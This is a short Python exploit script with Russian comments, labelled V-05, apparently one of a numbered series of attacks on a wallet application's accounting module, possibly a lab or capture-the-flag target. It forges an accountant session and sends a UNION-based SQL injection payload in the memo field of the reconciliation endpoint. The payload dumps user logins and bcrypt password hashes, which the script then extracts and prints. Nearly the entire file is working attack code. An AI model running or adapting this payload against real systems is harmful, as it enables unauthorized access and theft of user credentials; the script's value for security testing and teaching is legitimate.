# -*- coding: utf-8 -*-
"""V-05. SQL-инъекция в сверке бухгалтера (UNION).

handlers_accounting.go: memo-фильтр склеивается в
  WHERE memo LIKE '%<memo>%'
UNION подставляет строки из users в выдачу сверки. Роль accountant берём
подделкой сессии (V-02).
"""
import re

from wallet_client import Client, parser, banner, ok, fail


def main():
    a = parser("UNION SQLi в сверке").parse_args()
    c = Client(a.base)
    c.forge(5, "accountant")

    payload = "zzz%' UNION SELECT id, login, 0, password_hash, role FROM users-- -"
    st, _, body = c.post_form("/accounting/reconcile", {"memo": payload})
    txt = body.decode("utf-8", "replace")
    hashes = re.findall(r"(\$2[aby]\$\d\d\$[./A-Za-z0-9]{53})", txt)
    banner(f"статус {st}, найдено хэшей: {len(hashes)}")
    for h in hashes[:6]:
        banner(h)
    if not hashes:
        fail("UNION не вернул хэши")
    ok("UNION-инъекция в сверке выгрузила хэши паролей")


if __name__ == "__main__":
    main()
